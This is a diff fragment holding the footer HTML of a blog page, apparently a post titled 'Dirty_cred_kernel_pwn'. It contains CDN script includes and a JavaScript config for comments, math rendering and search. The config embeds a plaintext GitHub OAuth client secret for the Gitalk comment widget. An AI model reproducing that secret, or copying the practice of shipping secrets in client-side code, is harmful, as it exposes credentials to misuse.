+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"gitalk":{"admin":["cnitlrt"],"clientID":"2a776c3dc5f0100884f8","clientSecret":"b98d034dacc1331a3d9df7825119701a0a4b9533","id":"2023-11-26T00:46:08+08:00","owner":"cnitlrt","repo":"cnitlrt.github.io","title":"Dirty_cred_kernel_pwn"}},"data":{"id-1":"cnitlrtの博客","id-2":"cnitlrtの博客"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
